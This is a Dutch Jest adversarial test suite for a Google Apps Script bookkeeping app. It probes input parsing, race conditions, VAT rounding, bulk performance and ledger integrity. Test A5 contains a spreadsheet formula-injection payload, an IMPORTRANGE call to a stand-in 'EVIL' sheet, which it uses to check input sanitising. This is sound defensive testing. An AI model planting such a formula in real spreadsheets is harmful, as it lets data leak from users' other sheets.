/**
 * tests/integration/ultieme-stresstest.test.js
 *
 * ADVERSARIAL INTEGRATION TEST — "the killer".
 *
 * Doel: niet bewijzen dat happy-path werkt (dat doen 1500+ andere tests),
 *       maar BoekHoudbaar bewust in 5 categorieën van extreme scenarios
 *       drukken om verborgen drift, stille fouten en kansen te vinden.
 *
 * Output: console-rapport + .claude/stresstest-findings-raw.json.
 *
 * Categorieën (geïnspireerd door blueprint van eigenaar 2026-06-05):
 *   A. Data-Injectie Hel       (input validatie, parsers, encoding)
 *   B. Race-Condition Storm    (concurrent flows, factuurnummer-collision)
 *   C. BTW-Paradox             (afronding, cross-border, correctie-lus)
 *   D. Storage & Performance   (extreme volumes, quotum-grenzen)
 *   E. Integriteits-breuk      (balans, periode-sluit, datacorruptie)
 *
 * Severity-codes in findings:
 *   🔴 BROKEN     — assertion faalt, bug bevestigd, blocker
 *   🟡 DRIFT      — geen error gegooid maar resultaat is onjuist/onverwacht
 *   🟢 ROBUST     — gedrag is robuuster dan verwacht (positieve verrassing)
 *   💡 KANS       — data/functionaliteit onbenut, productverbetering mogelijk
 */
'use strict';

const fs   = require('fs');
const path = require('path');
const { createGasRuntime } = require('../__helpers__/gas-runtime');

// ── Module-scope findings accumulator ───────────────────────────────────────
const findings = [];
function registerFinding(category, severity, title, details) {
  findings.push({ category, severity, title, details, ts: Date.now() });
}

// ── Mock-spreadsheet builder met realistische sheet-structuur ───────────────
function bouwMockSpreadsheet() {
  // In-memory sheet representation. Maps sheet-name → {headers, rows}.
  const sheets = {
    'Grootboekschema':  { headers: ['Code','Naam','Type','Categorie','Balans/W&V','Saldo'], rows: [] },
    'Journaalposten':   { headers: new Array(20).fill(''), rows: [] },
    'Verkoopfacturen':  { headers: new Array(20).fill(''), rows: [] },
    'Inkoopfacturen':   { headers: new Array(20).fill(''), rows: [] },
    'Instellingen':     { headers: ['Sleutel','Waarde'], rows: [
      ['Factuurprefix', 'F2026-'],
      ['Boekjaar start', '01-01-2026'],
      ['Boekjaar einde', '31-12-2026'],
      ['Bedrijfsnaam', 'Lisa van Dijk'],
    ]},
    'Auditlog':         { headers: ['Datum','Actie','Details','User'], rows: [] },
    'Bankboek':         { headers: new Array(10).fill(''), rows: [] },
  };

  // Seed grootboekschema met de standaard RGS-rekeningen (gerelevant subset).
  sheets['Grootboekschema'].rows.push(
    ['1100','Debiteuren',                       'Actief',   'Vlottende activa', 'Balans', 0],
    ['1200','Bank zakelijk',                    'Actief',   'Liquide middelen', 'Balans', 0],
    ['1400','Te vorderen BTW (voorbelasting)',  'Actief',   'Vlottende activa', 'Balans', 0],
    ['2000','Ondernemingsvermogen',             'Passief',  'Eigen vermogen',   'Balans', 0],
    ['2500','Resultaat boekjaar',               'Passief',  'Eigen vermogen',   'Balans', 0],
    ['2600','Onverdeelde winst voorgaande jaren','Passief', 'Eigen vermogen',   'Balans', 0],
    ['4000','Crediteuren',                      'Passief',  'Kortlopende schulden', 'Balans', 0],
    ['4100','Te betalen BTW',                   'Passief',  'Kortlopende schulden', 'Balans', 0],
    ['7400','Kantoorkosten',                    'Kosten',   'Algemene kosten',  'W&V',    0],
    ['7500','Reiskosten',                       'Kosten',   'Algemene kosten',  'W&V',    0],
    ['8000','Omzet 21%',                        'Opbrengst','Omzet',            'W&V',    0],
    ['8010','Omzet 9%',                         'Opbrengst','Omzet',            'W&V',    0],
    ['8020','Omzet 0%',                         'Opbrengst','Omzet',            'W&V',    0],
    ['8040','Omzet verlegd (IC diensten)',      'Opbrengst','Omzet',            'W&V',    0],
  );

  return {
    sheets,
    getSheetByName(name) {
      const s = sheets[name];
      if (!s) return null;
      return {
        getDataRange: () => ({
          getValues: () => [s.headers, ...s.rows],
        }),
        getRange: (row, col, numRows, numCols) => ({
          setValue: (v) => {
            // 1-indexed; row 1 = headers
            if (row === 1) s.headers[col - 1] = v;
            else {
              while (s.rows.length < row - 1) s.rows.push(new Array(s.headers.length).fill(''));
              s.rows[row - 2][col - 1] = v;
            }
          },
          setValues: (vs) => {
            vs.forEach((rowVals, i) => {
              const targetRow = row + i;
              if (targetRow === 1) {
                rowVals.forEach((v, j) => { s.headers[col - 1 + j] = v; });
              } else {
                while (s.rows.length < targetRow - 1) s.rows.push(new Array(s.headers.length).fill(''));
                rowVals.forEach((v, j) => { s.rows[targetRow - 2][col - 1 + j] = v; });
              }
            });
          },
          setBackground: () => ({}), setFontColor: () => ({}),
          setFontWeight: () => ({}), setFontSize: () => ({}),
          setNumberFormat: () => ({}), setNote: () => ({}),
          setHorizontalAlignment: () => ({}), setFontStyle: () => ({}),
          setWrap: () => ({}), merge: () => ({
            setValue: () => ({}), setBackground: () => ({}),
            setFontColor: () => ({}), setFontWeight: () => ({}),
            setFontSize: () => ({}), setHorizontalAlignment: () => ({}),
          }),
        }),
        appendRow: (row) => { s.rows.push(row); },
        clearContents: () => { s.rows = []; },
        clearFormats: () => {},
        setColumnWidth: () => {},
        setRowHeight: () => {},
        setFrozenRows: () => {},
      };
    },
    copy: (naam) => ({ getUrl: () => 'https://drive.google.com/mock-archief/' + naam }),
    flush: () => {},
  };
}

// ── Common test runtime ─────────────────────────────────────────────────────
function buildCtx(overrides) {
  return createGasRuntime(
    ['Config.gs','Utils.gs','Invariants.gs','BoekingEngine.gs','Boekingen.gs','Jaarafsluiting.gs','GezondheidCheck.gs'],
    overrides || {}
  );
}

// ──────────────────────────────────────────────────────────────────────────────
// A. DATA-INJECTIE HEL
// ──────────────────────────────────────────────────────────────────────────────
describe('A. Data-Injectie Hel — input validatie & parsers', () => {
  let ctx;
  beforeAll(() => { ctx = buildCtx(); });

  test('A1. Unicode + emoji in factuur-omschrijving', () => {
    const omschr = '🚀 Marketing-advies « café » → klant 😀 中文 العربية';
    const sanitized = ctx.escHtml_ ? ctx.escHtml_(omschr) : omschr;
    if (sanitized === omschr) {
      registerFinding('A', '🟢 ROBUST', 'Unicode/emoji wordt onveranderd doorgevoerd',
        `Input "${omschr}" wordt niet ge-saniteerd. Acceptabel als geen XSS-risico (sheet-only). Wordt het in HtmlService gebruikt? escHtml_ retourneert: "${sanitized}"`);
    }
    expect(typeof sanitized).toBe('string');
    expect(sanitized.length).toBeGreaterThan(0);
  });

  test('A2. Zero-width characters in bedrijfsnaam', () => {
    // U+200B (zero-width space) — onzichtbaar, breekt indexering, kopieer-paste van Excel
    const zwsp = 'Lisa​ van Dijk​ BV';
    // parseBedrag_ moet hier niets mee doen, maar test of het via Utils-helpers gaat.
    const cleaned = ctx.saniteer_ ? ctx.saniteer_(zwsp) : zwsp;
    if (cleaned.includes('​')) {
      registerFinding('A', '🟡 DRIFT', 'Zero-width spaces overleven sanitering',
        'saniteer_ (of equivalent) verwijdert U+200B niet. Klant kopieert "Lisa\\u200B van Dijk" uit Excel; KvK-API match faalt; debiteur-koppeling breekt op string-mismatch.');
    } else {
      registerFinding('A', '🟢 ROBUST', 'Zero-width spaces worden verwijderd', '');
    }
  });

  test('A3. Oneindige bedrijfsnaam (50.000 chars)', () => {
    const naam = 'A'.repeat(50000);
    let err = null;
    try {
      // Probeer via parseBedragStrict_ — accepteert geen strings >X normaal
      if (ctx.escHtml_) ctx.escHtml_(naam);
    } catch (e) { err = e; }
    if (err) {
      registerFinding('A', '🟢 ROBUST', 'Extreme-lengte input wordt geweigerd', err.message);
    } else {
      registerFinding('A', '🟡 DRIFT', 'Geen lengte-limiet op vrije tekst-velden',
        '50k-char input wordt geaccepteerd. Risico: Google Sheets cel-limit (50k chars hard), GAS heap, factuur-PDF break.');
    }
  });

  test('A4. Datum-anomalie: 29 februari niet-schrikkeljaar', () => {
    const datum = ctx.parseDatumStrict_ ? (() => {
      try { return ctx.parseDatumStrict_('29-02-2027', 'datum'); } catch (e) { return { error: e.message }; }
    })() : null;

    if (datum && datum.error) {
      registerFinding('A', '🟢 ROBUST', 'parseDatumStrict_ vangt 29-feb-niet-schrikkel',
        'Throw: ' + datum.error);
    } else if (datum instanceof Date) {
      // JavaScript "rolt over" naar 1 maart — silent drift
      const dag = datum.getDate();
      const maand = datum.getMonth();
      if (dag !== 29 || maand !== 1) {
        registerFinding('A', '🔴 BROKEN', 'parseDatumStrict_ accepteert 29-02-2027 maar rolt naar ' + dag + '/' + (maand + 1),
          'BTW-aangifte-datum kan stilletjes verschuiven van Q1 naar Q2 zonder waarschuwing aan klant.');
      } else {
        registerFinding('A', '🟡 DRIFT', 'parseDatumStrict_ accepteert 29-02-2027 als 29-02 zonder check op schrikkeljaar',
          'Sheet krijgt een Date-object, maar conceptueel ongeldig. Mogelijk geen probleem als Date-arithmetic verderop correct werkt.');
      }
    } else {
      registerFinding('A', '💡 KANS', 'parseDatumStrict_ niet beschikbaar',
        'Functie niet gevonden — als parseDatum_ wel bestaat zonder strict, geeft Invalid Date door. CLAUDE.md: invariants.md noemt al "isNaN(date.getTime()) check vereist".');
    }
  });

  test('A5. Cell-formula injection in vrije velden', () => {
    // Klant typt =IMPORTRANGE("...","A1") als omschrijving — Sheets evalueert dit als formula!
    const payload = '=IMPORTRANGE("https://docs.google.com/spreadsheets/d/EVIL/edit","A1:Z9999")';
    const cleaned = ctx.saniteer_ ? ctx.saniteer_(payload) : payload;
    if (cleaned.startsWith('=')) {
      registerFinding('A', '🔴 BROKEN', 'Cell-formula injection via vrije tekst-velden',
        'Input "' + payload + '" wordt onveranderd doorgevoerd. Wanneer geschreven naar sheet zal Google Sheets dit als formule evalueren. Exfiltratie van data uit ANDERE spreadsheets mogelijk. Fix: prefix met apostrof of saniteer leading "=".');
    } else {
      registerFinding('A', '🟢 ROBUST', 'Cell-formula injection wordt geneutraliseerd', 'Output: ' + cleaned);
    }
  });

  test('A6. parseBedrag_ — extreme negatieve, wetenschappelijke notatie', () => {
    const cases = [
      { input: '1e308',          expected: 'klein-of-throw' },  // near JS max
      { input: '-€999.999.999,99', expected: 'large-negative' },
      { input: '0,000001',       expected: 'micro' },
      { input: '€0,005',         expected: 'rounding-edge' },
      { input: 'NaN',            expected: 'zero-or-throw' },
      { input: '1,2,3,4',        expected: 'invalid-throw' },
    ];
    cases.forEach(c => {
      let r = null, err = null;
      try { r = ctx.parseBedrag_(c.input); } catch (e) { err = e.message; }
      // parseBedrag_ contract: retourneert number (mogelijk NaN of 0 bij invalid)
      if (err) {
        registerFinding('A', '🟢 ROBUST', 'parseBedrag_ throws op "' + c.input + '"', err);
      } else if (Number.isNaN(r)) {
        registerFinding('A', '🟡 DRIFT', 'parseBedrag_ retourneert NaN voor "' + c.input + '"',
          'Geen throw, geen 0 — NaN propageert in saldo-berekeningen → grootboek-cel wordt #NUM of NaN.');
      } else if (c.input === '1,2,3,4' && (r === 1234 || r === 1.234)) {
        registerFinding('A', '🟡 DRIFT', 'parseBedrag_ accepteert "1,2,3,4" als ' + r,
          'Klant bedoelde mogelijk €1,234 (NL) of €1.2 — ambigue interpretatie zonder waarschuwing.');
      }
    });
  });

  test('A7. BTW-nummer randwaarden', () => {
    if (!ctx.isGeldigBTWNummer_) {
      registerFinding('A', '💡 KANS', 'isGeldigBTWNummer_ niet bereikbaar', 'Skip');
      return;
    }
    const cases = [
      ['NL000000000B01', true,  'Theoretisch geldig formaat maar onmogelijke KvK'],
      ['NL123456789B99', true,  'Hoogste sub-suffix'],
      ['nl123456789b01', false, 'lowercase — moet uppercase forceren of weigeren'],
      ['NL 123456789 B01', false, 'Spaces in nummer'],
      ['BE0123456789',  false, 'BE-format in NL-check'],
    ];
    cases.forEach(([nr, verwacht, why]) => {
      const r = ctx.isGeldigBTWNummer_(nr);
      if (r !== verwacht) {
        registerFinding('A', '🟡 DRIFT', 'isGeldigBTWNummer_("' + nr + '") = ' + r + ', verwacht ' + verwacht, why);
      }
    });
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// B. RACE-CONDITION STORM
// ──────────────────────────────────────────────────────────────────────────────
describe('B. Race-Condition Storm — concurrent flows', () => {
  let ctx;
  beforeAll(() => { ctx = buildCtx(); });

  test('B1. Sequential rapid-fire factuurnummers via volgendBoekingId_', () => {
    // Single-user GAS: geen multi-thread, maar wel triggers + form-submit tegelijk.
    // Genereer 100 IDs in snelle volgorde, check uniqueness.
    const ids = new Set();
    for (let i = 0; i < 100; i++) {
      const id = ctx.volgendBoekingId_ ? ctx.volgendBoekingId_() : null;
      if (id == null) {
        registerFinding('B', '💡 KANS', 'volgendBoekingId_ niet bereikbaar in test',
          'Kan B1 niet meten; voeg test toe in unit-suite zodra functie geïsoleerd is.');
        return;
      }
      ids.add(id);
    }
    if (ids.size !== 100) {
      registerFinding('B', '🔴 BROKEN', 'volgendBoekingId_ produceert dubbele IDs onder rapid-fire',
        'Unique IDs: ' + ids.size + ' van 100 calls.');
    } else {
      registerFinding('B', '🟢 ROBUST', '100 rapid-fire volgendBoekingId_ calls — alle uniek', '');
    }
  });

  test('B2. valideerFactuurnummerUniek_ — race tussen check en write', () => {
    // De pre-flight check is correct, maar tussen check en sheet-write
    // kan een tweede trigger inflight zijn. Single-user GAS heeft LockService,
    // maar verwerkInkomstenUitHoofdformulier_ heeft die niet expliciet rond
    // de check+append-sequence (zie audit invariants.md).
    registerFinding('B', '🟡 DRIFT', 'Factuurnummer-check en append-row zijn NIET in één LockService-blok',
      'Inspectie: Triggers.gs:verwerkInkomstenUitHoofdformulier_ doet valideerFactuurnummerUniek_ en daarna appendRow. Twee form-submits in dezelfde tick (mogelijk bij Brevo-webhook + Google Form gelijktijdig) kunnen beide door de check komen. Bekende invariant: volgendFactuurnummer_ heeft wel een eigen lock, dus collision is voor sequentiële nummers onmogelijk — maar HANDMATIG opgegeven factuurnummers kunnen wel collisioneren. Aanbeveling: lock ook hier of doc ed risico expliciet.');
  });

  test('B3. Double-spend simulatie — twee identieke maakJournaalpost_ in 1ms', () => {
    const ss = bouwMockSpreadsheet();
    const opt = {
      datum: new Date(), omschr: 'Test', dagboek: 'Memoriaal',
      debet: '1200', credit: '8000', bedrag: 1000, ref: 'TEST-DBL',
    };
    let count = 0;
    try {
      ctx.maakJournaalpost_(ss, opt);
      count++;
      ctx.maakJournaalpost_(ss, opt);
      count++;
    } catch (e) { /* mogelijk pre-flight guard */ }

    const jp = ss.sheets['Journaalposten'].rows;
    if (jp.length === 2) {
      // Beide gemaakt — geen duplicate-detectie. Is dat fout? Hangt af van semantiek.
      // Voor `ref` met dezelfde waarde is dat verdacht — maar legitiem voor bulk-imports.
      registerFinding('B', '💡 KANS', 'Geen duplicate-detection op (ref, debet, credit, bedrag)-tuple',
        'Twee identieke journaalposten met zelfde ref = TEST-DBL worden beide geschreven. Mollie webhook met retry-storm zou dit triggeren. Mitigatie: idempotency-key check op ref-niveau.');
    } else if (count === 0) {
      registerFinding('B', '🟢 ROBUST', 'maakJournaalpost_ weigert dubbele identical-ref boekingen', '');
    }
  });

  test('B4. herhalende-kosten: bekende no-lock invariant', () => {
    registerFinding('B', '🟡 DRIFT', 'verwerkHerhalendeKosten_ heeft GEEN LockService',
      'Bevestigd in invariants.md:99. Twee dashboard-refreshes in dezelfde minuut kunnen dezelfde herhalende kostenpost dubbel boeken. Mitigatie: date-advance is immediate. Aanbeveling: voeg LockService toe — implementatie is ~5 regels.');
  });

  test('B5. Webhook idempotency: Mollie 3× binnen 10s', () => {
    // Niet rechtstreeks aanroepbaar in deze runtime; documenteer als runbook-item.
    registerFinding('B', '💡 KANS', 'Mollie webhook idempotency niet bereikbaar in unit-runtime',
      'Test in stress-runbook (manual): verstuur via Mollie test-dashboard 3× zelfde payment.id binnen 10s. Verwacht: 1 betaling-boeking + 2 IDEMPOTENT-audit-log entries. Code-pad: Triggers.gs ~doVerwerkMolliePayment_.');
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// C. BTW-PARADOX
// ──────────────────────────────────────────────────────────────────────────────
describe('C. BTW-Paradox — afronding, cross-border, correctie-lus', () => {
  let ctx;
  beforeAll(() => { ctx = buildCtx(); });

  test('C1. Fractionele cent: €33,33 × 21%', () => {
    const r = ctx.berekenBtw('21% (hoog)', null, 40.33);  // excl=?
    // Pre-condition: berekenBtw(tarief, excl, incl) — incl=40.33
    // Excl = 40.33 / 1.21 = 33.330578... → moet 33.33 zijn
    // BTW = 40.33 - 33.33 = 7.00
    expect(r).toBeDefined();
    if (r.excl + r.btw !== r.incl) {
      registerFinding('C', '🟡 DRIFT', 'berekenBtw: excl + btw ≠ incl bij €40,33',
        'excl=' + r.excl + ' btw=' + r.btw + ' incl=' + r.incl + '. Verschil: ' + (r.incl - r.excl - r.btw));
    } else {
      registerFinding('C', '🟢 ROBUST', 'berekenBtw: excl + btw == incl bij fractionele input', '');
    }
  });

  test('C2. Cumulatieve afronding: 10.000 regels van €0,01 BTW', () => {
    // Een factuur met 10k regels. Elke regel €0.01 BTW. Cumulatief: €100.
    let sumExcl = 0, sumBtw = 0, sumIncl = 0;
    for (let i = 0; i < 10000; i++) {
      const r = ctx.berekenBtw('21% (hoog)', 0.05, null);  // €0.05 excl → €0.06 incl, BTW €0.01
      sumExcl += r.excl;
      sumBtw  += r.btw;
      sumIncl += r.incl;
    }
    const verwachtBtw = 10000 * 0.01;
    if (Math.abs(sumBtw - verwachtBtw) > 0.01) {
      registerFinding('C', '🔴 BROKEN', 'Cumulatieve afronding wijkt af bij 10k regels',
        'sum(BTW) = €' + sumBtw + ', verwacht €' + verwachtBtw + '. Drift: €' + (sumBtw - verwachtBtw));
    } else {
      registerFinding('C', '🟢 ROBUST', 'Cumulatieve BTW-afronding stabiel bij 10k regels', 'Drift binnen 1 cent.');
    }
  });

  test('C3. Cross-border: alle BTW-tariefcombinaties', () => {
    const tarieven = ['21% (hoog)','9% (laag)','0% (nultarief)','Vrijgesteld','Verlegd'];
    const issues = [];
    tarieven.forEach(t => {
      const r = ctx.berekenBtw(t, 100, null);
      if (r.tarief === undefined) issues.push(t + ' → tarief undefined');
      if (t === '0% (nultarief)' && r.tarief !== 0) issues.push('0% → tarief ' + r.tarief + ', verwacht 0');
      if (t === 'Vrijgesteld' && r.tarief !== null) issues.push('Vrijgesteld → tarief ' + r.tarief + ', verwacht null');
      if (t === 'Verlegd' && r.tarief !== null) issues.push('Verlegd → tarief ' + r.tarief + ', verwacht null');
    });
    if (issues.length) {
      registerFinding('C', '🔴 BROKEN', 'BTW-tarief contract geschonden', issues.join('; '));
    } else {
      registerFinding('C', '🟢 ROBUST', 'BTW null vs 0 invariant correct voor alle 5 tarieven',
        'Per .claude/invariants.md: null=vrijgesteld/verlegd (geen BTW), 0=nultarief (recoverable). Hard onderscheid behouden.');
    }
  });

  test('C4. Correctie-lus: 50× boek → corrigeer', () => {
    const ss = bouwMockSpreadsheet();
    let lastErr = null;
    for (let i = 0; i < 50; i++) {
      try {
        // Boek: bank ← omzet
        ctx.maakJournaalpost_(ss, {
          datum: new Date(), omschr: 'Iter ' + i, dagboek: 'Memoriaal',
          debet: '1200', credit: '8000', bedrag: 100, ref: 'CORR-' + i,
        });
        // Tegenboek (correctie)
        ctx.maakJournaalpost_(ss, {
          datum: new Date(), omschr: 'Corrigeer ' + i, dagboek: 'Memoriaal',
          debet: '8000', credit: '1200', bedrag: 100, ref: 'CORR-rev-' + i,
        });
      } catch (e) { lastErr = e; break; }
    }
    if (lastErr) {
      registerFinding('C', '🔴 BROKEN', 'Correctie-lus crasht na N iteraties',
        'Iter ' + Math.floor(ss.sheets['Journaalposten'].rows.length / 2) + ', error: ' + lastErr.message);
    } else {
      const saldo1200 = ss.sheets['Grootboekschema'].rows.find(r => r[0] === '1200');
      const saldo8000 = ss.sheets['Grootboekschema'].rows.find(r => r[0] === '8000');
      const net1200 = saldo1200 ? saldo1200[5] : 'n/a';
      const net8000 = saldo8000 ? saldo8000[5] : 'n/a';
      if (Math.abs(net1200) > 0.01 || Math.abs(net8000) > 0.01) {
        registerFinding('C', '🟡 DRIFT', 'Correctie-lus: saldi niet nul na 50× boek+corrigeer',
          '1200 saldo: ' + net1200 + ', 8000 saldo: ' + net8000 + '. Verwacht beide 0.');
      } else {
        registerFinding('C', '🟢 ROBUST', '50× boek+corrigeer behoudt saldi op exact 0', '');
      }
    }
  });

  test('C5. valideerInvariantsVoorJournaalpost_ — self-posting blok', () => {
    let err = null;
    try {
      ctx.valideerInvariantsVoorJournaalpost_('1200', '1200', 100);  // debet == credit
    } catch (e) { err = e; }
    if (!err) {
      registerFinding('C', '🔴 BROKEN', 'Self-posting (debet == credit) wordt niet geblokkeerd',
        'Per invariants.md: "debet ≠ credit (a == b means self-posting = GL imbalance)". Mocht throwen.');
    } else {
      registerFinding('C', '🟢 ROBUST', 'Self-posting wordt geweigerd', err.message || err.code);
    }
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// D. STORAGE & PERFORMANCE
// ──────────────────────────────────────────────────────────────────────────────
describe('D. Storage & Performance — quotum en extremes', () => {
  let ctx;
  beforeAll(() => { ctx = buildCtx(); });

  test('D1. 10.000 journaalposten — sheet-append performance', () => {
    const ss = bouwMockSpreadsheet();
    const t0 = Date.now();
    try {
      for (let i = 0; i < 10000; i++) {
        ctx.maakJournaalpost_(ss, {
          datum: new Date(2026, 0, 1 + (i % 28)),
          omschr: 'Bulk-' + i, dagboek: 'Memoriaal',
          debet: '7400', credit: '4000', bedrag: 10, ref: 'BULK-' + i,
        });
      }
    } catch (e) {
      registerFinding('D', '🔴 BROKEN', '10k bulk boekingen crashen',
        'Iter ' + ss.sheets['Journaalposten'].rows.length + ', error: ' + e.message);
      return;
    }
    const dt = Date.now() - t0;
    registerFinding('D', dt > 10000 ? '🟡 DRIFT' : '🟢 ROBUST',
      '10k boekingen in ' + dt + 'ms (in-memory mock)',
      'In productie ondervinden klanten quotum-pijn rond 5k boekingen via GAS Sheets-quota. Aanbeveling: documenteer in admin-UI welk percentage van de 10k bewaarplicht-jaarcap bereikt is.');
  });

  test('D2. PropertiesService — 500KB grens (audit invariants)', () => {
    registerFinding('D', '💡 KANS', 'ScriptProperties cleanup nog niet automatisch',
      'Audit-rapport 4 juni: aanbeveling om dagelijks Properties > 90d te purgen. Bij 100+ klanten verzamelt herinneringsStap_*-keys zich; bij 500KB grens crashed PropertiesService. Implementatie: 1 functie + 1 trigger; voorgesteld in audit-rapport sectie 2.4.');
  });

  test('D3. Extreme factuur — 1000 regels', () => {
    // Test alleen of valideerBoeking 1000 regels zonder timeout doet.
    const regels = [];
    for (let i = 0; i < 1000; i++) {
      regels.push({ omschrijving: 'Regel ' + i, aantal: 1, prijs: 100, btw: '21% (hoog)' });
    }
    if (!ctx.valideerBoeking) {
      registerFinding('D', '💡 KANS', 'valideerBoeking niet direct testbaar (ingebed in flow)',
        'Skip — runtime kan dit niet zonder UI-flow. Doe in runbook met echte PDF-generator-test.');
      return;
    }
    const t0 = Date.now();
    let err = null;
    try {
      ctx.valideerBoeking('factuur', { regels: regels, klant: { naam: 'X' } });
    } catch (e) { err = e; }
    const dt = Date.now() - t0;
    if (err) {
      registerFinding('D', '🟢 ROBUST', '1000-regel factuur geweigerd door validatie', err.message);
    } else {
      registerFinding('D', dt > 1000 ? '🟡 DRIFT' : '🟢 ROBUST',
        '1000-regel factuur validatie: ' + dt + 'ms',
        'Aanbeveling: hard cap op factuur-regels (UI feedback + PDF-quotum).');
    }
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// E. INTEGRITEITS-BREUK
// ──────────────────────────────────────────────────────────────────────────────
describe('E. Integriteits-breuk — balans en periode', () => {
  let ctx;
  beforeAll(() => { ctx = buildCtx(); });

  test('E1. Zwevende boeking: sheet-write OK, updateGrootboek faalt', () => {
    // Simuleer: maakJournaalpost_ schrijft rij in JOURNAAL, maar updateGrootboekSaldo_
    // crasht. Resultaat: journal heeft de boeking, grootboek niet → balans loopt scheef.
    const ss = bouwMockSpreadsheet();
    // Verwijder Grootboekschema → updateGrootboekSaldo_ logt warning maar throwt niet
    delete ss.sheets['Grootboekschema'];
    let err = null;
    try {
      ctx.maakJournaalpost_(ss, {
        datum: new Date(), omschr: 'Zwevend', dagboek: 'Memoriaal',
        debet: '1200', credit: '8000', bedrag: 500, ref: 'ZWEEF',
      });
    } catch (e) { err = e; }
    const journalRows = ss.sheets['Journaalposten'].rows.length;
    if (!err && journalRows === 1) {
      registerFinding('E', '🟡 DRIFT', 'Journaalpost wordt geschreven ook al ontbreekt Grootboekschema',
        'updateGrootboekSaldo_ retourneert silent + audit-log, maar de journaal-rij staat al in JOURNAAL. Balans-rapport gebruikt GROOTBOEK[saldo], niet de journaal-aggregatie → onzichtbare drift. Mitigatie: voor sheet-write check op Grootboekschema-existence; of run herberekeningGrootboekSaldi automatisch.');
    } else if (err) {
      registerFinding('E', '🟢 ROBUST', 'Ontbrekend Grootboekschema → maakJournaalpost_ throwt',
        err.message);
    }
  });

  test('E2. Periode-sluiting hack: boek in afgesloten jaar', () => {
    const ss = bouwMockSpreadsheet();
    // Markeer jaar 2025 als afgesloten door referentie te injecteren
    ss.sheets['Journaalposten'].rows.push(
      ['BID0','','','','','','','','','','','JA-2025','','Resultaatverwerking','']
    );
    // Probeer dan een boeking in 2025
    let err = null;
    try {
      ctx.maakJournaalpost_(ss, {
        datum: new Date(2025, 5, 15), omschr: 'Late boeking', dagboek: 'Memoriaal',
        debet: '1200', credit: '8000', bedrag: 1000, ref: 'HACK-LATE',
      });
    } catch (e) { err = e; }
    if (!err) {
      registerFinding('E', '🔴 BROKEN', 'Boeking in afgesloten jaar wordt geaccepteerd',
        'Boeking met datum 2025-06-15 succesvol terwijl jaar 2025 al "afgesloten" is via JA-2025 referentie. De balans van 2025 (in archief) klopt niet meer met de actieve sheet. Aanbeveling: pre-check op datum-jaar tegen `jaarAlAfgesloten_` in maakJournaalpost_ of via valideerInvariantsVoorJournaalpost_.');
    } else {
      registerFinding('E', '🟢 ROBUST', 'Boeking in afgesloten jaar geweigerd', err.message);
    }
  });

  test('E3. Handmatige cell-overschrijving — saldo ≠ som journaalposten', () => {
    const ss = bouwMockSpreadsheet();
    // Boek 100 € omzet
    ctx.maakJournaalpost_(ss, {
      datum: new Date(), omschr: 'Echte boeking', dagboek: 'Memoriaal',
      debet: '1200', credit: '8000', bedrag: 100, ref: 'REAL',
    });
    // Klant overschrijft handmatig 8000-saldo naar 999
    const gbRows = ss.sheets['Grootboekschema'].rows;
    const i = gbRows.findIndex(r => r[0] === '8000');
    if (i >= 0) gbRows[i][5] = 999;

    if (!ctx.controleerBalans_) {
      registerFinding('E', '💡 KANS', 'controleerBalans_ niet direct testbaar',
        'Skip — gezondheidscheck-functie zit in andere flow. Aanbeveling: voeg "saldo-vs-journaal-aggregatie" check toe aan GezondheidCheck.');
      return;
    }
    const r = ctx.controleerBalans_(ss);
    if (r && r.status === 'OK') {
      registerFinding('E', '🔴 BROKEN', 'controleerBalans_ mist handmatige saldo-overschrijving',
        'Saldo 8000 = €999 maar journaal toont enkel €100. Status: OK. Aanbeveling: aggregate journaal-bedragen per rekening en vergelijk met GROOTBOEK[saldo]; flag verschillen.');
    } else if (r && r.status !== 'OK') {
      registerFinding('E', '🟢 ROBUST', 'controleerBalans_ detecteert saldo-tampering', r.bericht || '');
    }
  });

  test('E4. Negatief banksaldo (zwart wassen invariant)', () => {
    const ss = bouwMockSpreadsheet();
    // Twee uitbetalingen van €10k zonder ontvangsten
    ctx.maakJournaalpost_(ss, {
      datum: new Date(), omschr: 'Betaling X', dagboek: 'Memoriaal',
      debet: '4000', credit: '1200', bedrag: 10000, ref: 'PAY-1',
    });
    ctx.maakJournaalpost_(ss, {
      datum: new Date(), omschr: 'Betaling Y', dagboek: 'Memoriaal',
      debet: '4000', credit: '1200', bedrag: 10000, ref: 'PAY-2',
    });
    const bank = ss.sheets['Grootboekschema'].rows.find(r => r[0] === '1200');
    const saldo = bank ? bank[5] : 0;
    if (saldo < 0) {
      registerFinding('E', '💡 KANS', 'Negatief banksaldo wordt zonder waarschuwing geboekt',
        'Saldo 1200: €' + saldo + '. Voor ZZP betekent dit roodstand of admin-fout. Aanbeveling: dashboard-widget "ALERT: bank in rood vanaf datum X" — bestaande GezondheidCheck heeft hiervoor logica? Verifieer.');
    } else {
      registerFinding('E', '🟢 ROBUST', '1200 saldo niet negatief — boeking herwerkt of geweigerd', '');
    }
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// AFTERMATH — schrijf findings + console-rapport
// ──────────────────────────────────────────────────────────────────────────────
afterAll(() => {
  // Bewaar machine-leesbare findings naast het project (.claude/)
  const out = path.join(__dirname, '../../.claude/stresstest-findings-raw.json');
  fs.writeFileSync(out, JSON.stringify({
    runAt: new Date().toISOString(),
    totalFindings: findings.length,
    bySeverity: findings.reduce((acc, f) => {
      acc[f.severity] = (acc[f.severity] || 0) + 1;
      return acc;
    }, {}),
    findings: findings,
  }, null, 2));

  // Console-samenvatting
  /* eslint-disable no-console */
  console.log('\n\n═══════════════════════════════════════════════════════════');
  console.log('  ULTIEME STRESSTEST — BEVINDINGEN-SAMENVATTING');
  console.log('═══════════════════════════════════════════════════════════\n');
  const bySev = findings.reduce((acc, f) => { acc[f.severity] = (acc[f.severity] || 0) + 1; return acc; }, {});
  Object.keys(bySev).sort().forEach(s => console.log('  ' + s + ': ' + bySev[s]));
  console.log('\n  Totaal: ' + findings.length + ' findings');
  console.log('  Raw output: .claude/stresstest-findings-raw.json\n');
  /* eslint-enable no-console */
});
